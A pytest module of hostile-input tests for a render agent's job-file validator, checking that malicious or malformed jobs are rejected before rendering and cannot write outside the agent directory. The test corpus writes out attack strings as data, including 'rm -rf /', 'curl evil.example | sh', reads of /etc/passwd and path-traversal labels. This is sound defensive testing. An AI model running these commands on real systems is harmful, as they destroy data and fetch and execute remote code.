"""Hostile-input tests for the render agent's job validation.

The agent runs in the user's logged-in GUI session with their full filesystem
privileges, and the job files it reads may be written by an automated caller.
Its security therefore rests on one claim: **a job file is parameters only, and
anything else is rejected before a single pixel is rendered.**

This module attacks that claim.  Every case asserts three things together,
because any one alone is insufficient:

1. the job is rejected (its status says so, with a reason),
2. the render function is *never called* -- rejection must precede rendering,
   not clean up after it,
3. nothing is written outside ``.render_agent/``.

The renderer is stubbed throughout, so these run with no GL context and no GPU
and are safe in CI.
"""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from tools import render_agent as ra
from tools.render_agent import JobRejected, validate_job, validate_job_id

# ---------------------------------------------------------------------------
# Harness
# ---------------------------------------------------------------------------


class RenderSpy:
    """Stands in for the real renderer and records every call."""

    def __init__(self) -> None:
        self.calls: list[tuple] = []

    def __call__(self, job, out_dir: Path) -> dict:
        self.calls.append((job, Path(out_dir)))
        Path(out_dir).mkdir(parents=True, exist_ok=True)
        (Path(out_dir) / f"{job.modes[0]}.png").write_bytes(b"\x89PNG stub")
        return {"stub": True, "modes": list(job.modes)}

    @property
    def called(self) -> bool:
        return bool(self.calls)


@pytest.fixture
def agent(tmp_path, monkeypatch):
    """Redirect every agent path into tmp_path and return a small facade."""
    root = tmp_path / ".render_agent"
    jobs = root / "jobs"
    done = jobs / "done"
    results = root / "results"
    status = root / "status"
    monkeypatch.setattr(ra, "AGENT_DIR", root)
    monkeypatch.setattr(ra, "JOBS_DIR", jobs)
    monkeypatch.setattr(ra, "DONE_DIR", done)
    monkeypatch.setattr(ra, "RESULTS_DIR", results)
    monkeypatch.setattr(ra, "STATUS_DIR", status)
    monkeypatch.setattr(ra, "LOCK_FILE", root / "agent.lock")
    ra.ensure_dirs()

    # A canary outside .render_agent/ but inside tmp_path: if the agent ever
    # writes outside its own tree, this is where a traversal would land.
    outside = tmp_path / "OUTSIDE_CANARY"
    outside.mkdir()
    (outside / "precious.txt").write_text("must not be touched")

    class Facade:
        def __init__(self):
            self.root, self.jobs, self.done = root, jobs, done
            self.results, self.status = results, status
            self.tmp, self.outside = tmp_path, outside
            self.spy = RenderSpy()

        def submit(self, name: str, payload) -> Path:
            """Write a job file.

            ``bytes`` are written verbatim -- that is how the malformed-file
            cases put invalid JSON, bad UTF-8 and NUL bytes on disk.  Anything
            else is JSON-encoded, including scalars: the ``shape_*`` cases test
            that a *valid* JSON scalar is rejected for not being an object, so
            they must not be written as raw text (which would be rejected one
            step earlier, as a parse error, and prove nothing).
            """
            p = jobs / f"{name}.json"
            if isinstance(payload, bytes):
                p.write_bytes(payload)
            else:
                p.write_text(json.dumps(payload))
            return p

        def run(self, path: Path) -> dict:
            return ra.process_job_file(path, render_fn=self.spy)

        def outside_snapshot(self) -> set:
            """Every path in tmp_path that is NOT under .render_agent/."""
            out = set()
            for dirpath, dirnames, filenames in os.walk(tmp_path):
                d = Path(dirpath)
                if root == d or root in d.parents:
                    dirnames[:] = []
                    continue
                for f in filenames:
                    out.add((d / f).relative_to(tmp_path))
            return out

    return Facade()


# ---------------------------------------------------------------------------
# The hostile corpus.  (case_id, payload, substring expected in the reason)
# ---------------------------------------------------------------------------

HOSTILE_JOBS = [
    # --- unknown keys: the primary injection surface -----------------------
    ("unknown_command_key", {"command": "rm -rf /"}, "unknown key"),
    ("unknown_path_key", {"path": "/etc/passwd"}, "unknown key"),
    ("unknown_script_key", {"modes": ["SOLID"], "script": "import os"}, "unknown key"),
    ("unknown_shell_key", {"shell": "curl evil.example | sh"}, "unknown key"),
    ("unknown_out_key", {"out": "/tmp/anywhere"}, "unknown key"),
    ("unknown_meshes_list", {"mesh_files": ["../../../etc/passwd"]}, "unknown key"),
    ("unknown_format_string", {"fmt": "{0.__class__.__mro__}"}, "unknown key"),
    ("unknown_extra_alongside_valid", {"size": "64x64", "camera": "oblique", "z": 0},
     "unknown key"),

    # --- path traversal, in the one field that reaches a path --------------
    ("traversal_label_dotdot", {"label": "../../../../tmp/pwned"}, "label"),
    ("traversal_label_absolute", {"label": "/etc/passwd"}, "label"),
    ("traversal_label_slash", {"label": "a/b"}, "label"),
    ("traversal_label_backslash", {"label": "a\\b"}, "label"),
    ("traversal_label_dot", {"label": ".."}, "label"),
    ("traversal_label_hidden", {"label": ".ssh"}, "label"),
    ("traversal_label_nul", {"label": "a\u0000b"}, "label"),
    ("traversal_label_newline", {"label": "a\nb"}, "label"),
    ("traversal_label_tilde", {"label": "~/secrets"}, "label"),
    ("traversal_label_empty", {"label": ""}, "label"),
    ("traversal_label_too_long", {"label": "x" * 65}, "label"),
    ("traversal_label_unicode", {"label": "café"}, "label"),

    # --- wrong types: nothing is coerced ----------------------------------
    ("type_modes_string", {"modes": "SOLID,XRAY"}, "must be a list"),
    ("type_modes_dict", {"modes": {"a": 1}}, "must be a list"),
    ("type_modes_int", {"modes": 5}, "must be a list"),
    ("type_modes_nested", {"modes": [["SOLID"]]}, "must be strings"),
    ("type_modes_null_entry", {"modes": [None]}, "must be strings"),
    ("type_modes_empty", {"modes": []}, "must not be empty"),
    ("type_meshes_string", {"meshes": "8"}, "must be an integer"),
    ("type_meshes_float", {"meshes": 8.5}, "must be an integer"),
    ("type_meshes_bool", {"meshes": True}, "must be an integer"),
    ("type_meshes_null", {"meshes": None}, "must be an integer"),
    ("type_meshes_list", {"meshes": [8]}, "must be an integer"),
    ("type_size_int", {"size": 512}, "must be a string"),
    ("type_size_list", {"size": [512, 512]}, "must be a string"),
    ("type_camera_int", {"camera": 3}, "must be a string"),
    ("type_camera_list", {"camera": ["oblique"]}, "must be a string"),
    ("type_label_int", {"label": 42}, "must be a string"),
    ("type_label_list", {"label": ["a"]}, "must be a string"),

    # --- out-of-range / resource exhaustion -------------------------------
    ("range_size_huge", {"size": "99999x99999"}, "must match WxH"),
    ("range_size_4097", {"size": "4097x4097"}, "outside the clamp range"),
    ("range_size_zero", {"size": "0x0"}, "outside the clamp range"),
    ("range_size_too_small", {"size": "63x63"}, "outside the clamp range"),
    ("range_size_negative", {"size": "-1x-1"}, "must match WxH"),
    ("range_size_expression", {"size": "512*512"}, "must match WxH"),
    ("range_size_spaces", {"size": " 512x512 "}, "must match WxH"),
    ("range_size_units", {"size": "512px x 512px"}, "must match WxH"),
    ("range_size_way_too_long", {"size": "5" * 40}, "too long"),
    ("range_size_hex", {"size": "0x200x0x200"}, "must match WxH"),
    ("range_meshes_zero", {"meshes": 0}, "outside the clamp range"),
    ("range_meshes_negative", {"meshes": -5}, "outside the clamp range"),
    ("range_meshes_huge", {"meshes": 10**9}, "outside the clamp range"),
    ("range_modes_too_many", {"modes": ["SOLID"] * 17}, "max 16"),

    # --- unknown enum members --------------------------------------------
    ("enum_mode_unknown", {"modes": ["NOT_A_MODE"]}, "unknown render mode"),
    ("enum_mode_lowercase", {"modes": ["solid"]}, "unknown render mode"),
    ("enum_mode_dunder", {"modes": ["__class__"]}, "unknown render mode"),
    ("enum_mode_partly_valid", {"modes": ["SOLID", "NOPE"]}, "unknown render mode"),
    ("enum_camera_unknown", {"camera": "nowhere"}, "unknown camera preset"),
    ("enum_camera_traversal", {"camera": "../../etc"}, "unknown camera preset"),

    # --- wrong top-level shape -------------------------------------------
    ("shape_list", ["SOLID"], "must be a JSON object"),
    ("shape_string", "SOLID", "must be a JSON object"),
    ("shape_number", 42, "must be a JSON object"),
    ("shape_null", None, "must be a JSON object"),
    ("shape_bool", True, "must be a JSON object"),
]

MALFORMED_FILES = [
    ("malformed_not_json", b"this is not json at all", "not valid JSON"),
    ("malformed_truncated", b'{"modes": ["SOLID"', "not valid JSON"),
    ("malformed_empty", b"", "not valid JSON"),
    ("malformed_nul_bytes", b'{"modes": ["SOL\x00ID"]}', "NUL"),
    ("malformed_bad_utf8", b'{"label": "\xff\xfe"}', "not valid UTF-8"),
    ("malformed_yaml", b"modes:\n  - SOLID\n", "not valid JSON"),
    ("malformed_python_repr", b"{'modes': ['SOLID']}", "not valid JSON"),
]


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(("case", "payload", "expect"), HOSTILE_JOBS,
                         ids=[c[0] for c in HOSTILE_JOBS])
def test_hostile_job_is_rejected_and_nothing_rendered(agent, case, payload, expect):
    before = agent.outside_snapshot()
    p = agent.submit(case, payload)

    status = agent.run(p)

    assert status["state"] == "rejected", f"{case}: state was {status['state']}"
    assert status["rendered"] is False
    assert expect in status["reason"], (
        f"{case}: reason {status['reason']!r} does not mention {expect!r}"
    )
    assert not agent.spy.called, f"{case}: the renderer was invoked for a rejected job"
    assert agent.outside_snapshot() == before, f"{case}: wrote outside .render_agent/"
    # No results directory should have been created for a rejected job.
    assert not list(agent.results.glob("*")), f"{case}: created a results directory"


@pytest.mark.parametrize(("case", "raw", "expect"), MALFORMED_FILES,
                         ids=[c[0] for c in MALFORMED_FILES])
def test_malformed_file_is_rejected(agent, case, raw, expect):
    before = agent.outside_snapshot()
    p = agent.submit(case, raw)

    status = agent.run(p)

    assert status["state"] == "rejected"
    assert expect in status["reason"], f"{case}: reason was {status['reason']!r}"
    assert not agent.spy.called
    assert agent.outside_snapshot() == before
    assert not list(agent.results.glob("*"))


def test_oversized_job_file_is_rejected_before_parsing(agent):
    # Valid JSON, but far over the size cap: rejected on size, not on content,
    # so the JSON parser never sees it.
    payload = {"label": "ok", "modes": ["SOLID"], "size": "64x64",
               "camera": "oblique", "meshes": 1}
    text = json.dumps(payload) + " " * (ra.MAX_JOB_BYTES + 100)
    p = agent.jobs / "oversized.json"
    p.write_text(text)

    status = agent.run(p)

    assert status["state"] == "rejected"
    assert "bytes, max" in status["reason"]
    assert not agent.spy.called


def test_symlinked_job_file_is_refused(agent, tmp_path):
    target = tmp_path / "elsewhere.json"
    target.write_text(json.dumps({"modes": ["SOLID"], "size": "64x64"}))
    link = agent.jobs / "sneaky.json"
    try:
        link.symlink_to(target)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks not supported here")

    status = agent.run(link)

    assert status["state"] == "rejected"
    assert "symlink" in status["reason"]
    assert not agent.spy.called


def test_job_id_from_filename_must_be_a_slug(agent):
    # process_job_file derives the id from the filename it enumerated.  A
    # non-slug id must not reach a status path.
    for bad in ("../escape", "a/b", "a b", "..", "x" * 65):
        with pytest.raises(JobRejected):
            validate_job_id(bad)


def test_non_slug_job_id_still_produces_a_status_file(agent):
    # A file whose stem is not a slug must be reported, under a fixed safe
    # name, rather than crashing the agent or naming a file from its stem.
    p = agent.jobs / "has spaces.json"
    p.write_text(json.dumps({"modes": ["SOLID"]}))

    status = agent.run(p)

    assert status["state"] == "rejected"
    assert not agent.spy.called
    assert (agent.status / "invalid_job_id.json").is_file(), (
        "a non-slug job id must be recorded under the fixed safe name"
    )


def test_traversal_in_filename_cannot_escape_status_dir(agent, tmp_path):
    # Even if a caller manages to create a file with a traversing stem, the
    # status write is guarded by both the slug regex and assert_contained.
    with pytest.raises(JobRejected):
        ra.write_status("../../pwned", {"state": "x"})
    assert not (tmp_path / "pwned.json").exists()
    assert not (tmp_path.parent / "pwned.json").exists()


def test_assert_contained_blocks_escapes(agent):
    ok = ra.assert_contained(agent.results / "fine", agent.root)
    assert ok.is_relative_to(agent.root.resolve())
    for bad in (Path("/etc/passwd"), agent.root / ".." / "outside", Path("/tmp")):
        with pytest.raises(JobRejected):
            ra.assert_contained(bad, agent.root)


# --- the positive path: a valid job must actually work ---------------------

VALID_JOBS = [
    ("all_defaults", {}, 16, 16, (512, 512), "oblique", "job"),
    ("explicit_modes", {"modes": ["XRAY", "SOLID"]}, 2, 16, (512, 512), "oblique", "job"),
    ("full_spec", {"modes": ["SOLID"], "meshes": 4, "size": "128x64",
                   "camera": "anterior", "label": "base-line_1"}, 1, 4, (128, 64),
     "anterior", "base-line_1"),
    ("boundary_min", {"meshes": 1, "size": "64x64"}, 16, 1, (64, 64), "oblique", "job"),
    ("boundary_max", {"meshes": 16, "size": "4096x4096"}, 16, 16, (4096, 4096),
     "oblique", "job"),
    ("uppercase_x_size", {"size": "256X256"}, 16, 16, (256, 256), "oblique", "job"),
]


@pytest.mark.parametrize(
    ("case", "payload", "n_modes", "meshes", "size", "camera", "label"),
    VALID_JOBS, ids=[c[0] for c in VALID_JOBS],
)
def test_valid_job_is_accepted_with_expected_parameters(
    agent, case, payload, n_modes, meshes, size, camera, label
):
    p = agent.submit(case, payload)

    status = agent.run(p)

    assert status["state"] == "done", f"{case}: {status.get('reason')}"
    assert status["rendered"] is True
    assert agent.spy.called, f"{case}: the renderer was not invoked"
    job, out_dir = agent.spy.calls[0]
    assert len(job.modes) == n_modes
    assert job.meshes == meshes
    assert job.size == size
    assert job.camera == camera
    assert job.label == label
    # The output directory is built from the job id, never from job content.
    assert out_dir == (agent.results / case).resolve()


def test_modes_are_normalised_to_enum_order(agent):
    from tools.capture_golden import ALL_MODES

    j = validate_job({"modes": ["ETHEREAL", "SOLID", "XRAY"]}, "j")
    assert j.modes == [m for m in ALL_MODES if m in {"ETHEREAL", "SOLID", "XRAY"}]
    assert j.modes.index("SOLID") < j.modes.index("XRAY") < j.modes.index("ETHEREAL")


def test_duplicate_modes_collapse_with_a_warning(agent):
    j = validate_job({"modes": ["SOLID", "SOLID", "XRAY"]}, "j")
    assert j.modes == ["SOLID", "XRAY"]
    assert any("duplicate" in w for w in j.warnings)


def test_processed_job_is_moved_to_done_not_deleted(agent):
    p = agent.submit("movable", {"modes": ["SOLID"], "size": "64x64"})
    assert p.is_file()

    agent.run(p)

    assert not p.exists(), "job file should have left jobs/"
    assert (agent.done / "movable.json").is_file(), "job file must be preserved in done/"


def test_resubmitting_the_same_id_does_not_overwrite_the_done_record(agent):
    for _ in range(2):
        p = agent.submit("repeat", {"modes": ["SOLID"], "size": "64x64"})
        agent.run(p)
    names = sorted(x.name for x in agent.done.glob("repeat*"))
    assert names == ["repeat.1.json", "repeat.json"], names


def test_rejected_job_is_also_moved_to_done(agent):
    p = agent.submit("bad_move", {"command": "x"})
    agent.run(p)
    assert not p.exists()
    assert (agent.done / "bad_move.json").is_file()


def test_pending_jobs_ignores_the_done_subdirectory(agent):
    (agent.done / "old.json").write_text("{}")
    agent.submit("live", {"modes": ["SOLID"]})
    names = [p.name for p in ra.pending_jobs()]
    assert names == ["live.json"], names


def test_status_file_is_written_for_every_outcome(agent):
    agent.run(agent.submit("good", {"modes": ["SOLID"], "size": "64x64"}))
    agent.run(agent.submit("bad", {"nope": 1}))
    good = json.loads((agent.status / "good.json").read_text())
    bad = json.loads((agent.status / "bad.json").read_text())
    assert good["state"] == "done" and good["rendered"] is True
    assert bad["state"] == "rejected" and bad["rendered"] is False
    assert "reason" in bad


def test_render_failure_is_contained_and_reported(agent):
    def boom(job, out_dir):
        raise RuntimeError("simulated GL failure")

    p = agent.submit("explodes", {"modes": ["SOLID"], "size": "64x64"})
    status = ra.process_job_file(p, render_fn=boom)

    assert status["state"] == "failed"
    assert "simulated GL failure" in status["reason"]
    assert status["rendered"] is False
    assert "traceback" in status
    # And the agent moved on rather than dying.
    assert (agent.done / "explodes.json").is_file()


def test_lock_refuses_a_second_live_instance(agent):
    first = ra.AgentLock(agent.root / "agent.lock")
    first.acquire()
    try:
        second = ra.AgentLock(agent.root / "agent.lock")
        with pytest.raises(ra.AgentLocked) as exc:
            second.acquire()
        assert str(os.getpid()) in str(exc.value)
    finally:
        first.release()


def test_stale_lock_is_taken_over(agent):
    lock_path = agent.root / "agent.lock"
    # pid 0 is never a live user process; os.kill(0, 0) targets a process
    # group, so use an implausible-but-valid pid that is not running.
    dead_pid = 2**22 - 1
    lock_path.write_text(json.dumps({"pid": dead_pid, "started": 0}))
    lock = ra.AgentLock(lock_path)
    lock.acquire()          # must not raise
    try:
        assert lock.acquired
        assert json.loads(lock_path.read_text())["pid"] == os.getpid()
    finally:
        lock.release()


def test_release_blanks_the_lock_rather_than_deleting_it(agent):
    lock_path = agent.root / "agent.lock"
    lock = ra.AgentLock(lock_path)
    lock.acquire()
    lock.release()
    assert lock_path.exists(), "the agent must not delete files, even its own lock"
    assert lock_path.read_text() == ""


def test_run_once_drains_the_queue_without_gl(agent, monkeypatch, capsys):
    agent.submit("a", {"modes": ["SOLID"], "size": "64x64"})
    agent.submit("b", {"unknown": 1})

    rc = ra.run(once=True, render_fn=agent.spy)

    assert rc == 0
    assert len(agent.spy.calls) == 1, "only the valid job should have rendered"
    assert not list(agent.jobs.glob("*.json")), "queue should be drained"
    assert {p.name for p in agent.done.glob("*.json")} == {"a.json", "b.json"}
    banner = capsys.readouterr().out
    assert "WILL NOT DO" in banner and "delete anything" in banner


def test_whole_hostile_corpus_leaves_nothing_outside_the_agent_dir(agent):
    """The corpus run in one batch: a global containment assertion."""
    before = agent.outside_snapshot()
    for case, payload, _ in HOSTILE_JOBS:
        agent.run(agent.submit(case, payload))
    for case, raw, _ in MALFORMED_FILES:
        agent.run(agent.submit(case, raw))

    assert not agent.spy.called, "no hostile job may render"
    assert agent.outside_snapshot() == before, "hostile corpus escaped .render_agent/"
    assert (agent.outside / "precious.txt").read_text() == "must not be touched"
    n = len(HOSTILE_JOBS) + len(MALFORMED_FILES)
    assert len(list(agent.done.glob("*.json"))) == n, "every job should be filed in done/"


def test_allowed_key_set_is_exactly_the_documented_five():
    assert ra.ALLOWED_JOB_KEYS == {"modes", "meshes", "size", "camera", "label"}, (
        "the accepted key set is the security contract; changing it needs a "
        "matching change to the banner, the README and these tests"
    )
